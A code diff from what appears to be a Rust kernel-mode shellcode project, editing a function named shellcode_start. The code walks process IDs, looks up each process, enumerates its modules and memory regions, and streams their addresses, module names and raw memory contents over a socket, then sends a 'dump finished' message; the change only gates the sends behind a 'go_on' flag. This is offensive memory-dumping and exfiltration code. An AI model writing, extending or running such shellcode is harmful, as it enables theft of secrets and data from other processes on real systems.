@@ -170,11 +170,12 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                                     core::mem::MaybeUninit::uninit().assume_init()
                                 }
                             };
-                    
-                            let region_info = ScrapeInfo { scrape_type: ScrapeType::Module, address: address as _, size: size as _ };
-                            let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
-                            let _ = socket.send(nameptr as _, 100);
-                            i = i + 1;
+                            if go_on == 1 as _ {
+                                let region_info = ScrapeInfo { scrape_type: ScrapeType::Module, address: address as _, size: size as _ };
+                                let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
+                                let _ = socket.send(nameptr as _, 100);
+                                i = i + 1;
+                            }
                         }
                     }
                     i = 0;
@@ -190,12 +191,12 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                                     core::mem::MaybeUninit::uninit().assume_init()
                                 }
                             };
-                    
-                            let region_info = ScrapeInfo { scrape_type: ScrapeType::Memory, address: address as _, size: size as _ };
-                            let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
-                            let _ = socket.send(address as _, size as _);
-
-                            i = i + 1;
+                            if go_on == 1 as _ {
+                                let region_info = ScrapeInfo { scrape_type: ScrapeType::Memory, address: address as _, size: size as _ };
+                                let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
+                                let _ = socket.send(address as _, size as _);
+                                i = i + 1;
+                            }
                         }
                     }
                     let dump_finished_msg = [0x0au8, 0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
@@ -212,7 +213,6 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                 let mut pid: u32 = 0x0;
                 while pid < 0xffff as _ {
                     pid += 4;
-    
                     let mut process: ntdef::structs::PEPROCESS = core::ptr::null_mut();
                     let status = ((*mem_funcs).ps_lookup_process_by_process_id)(pid as _, &mut process as _);
     
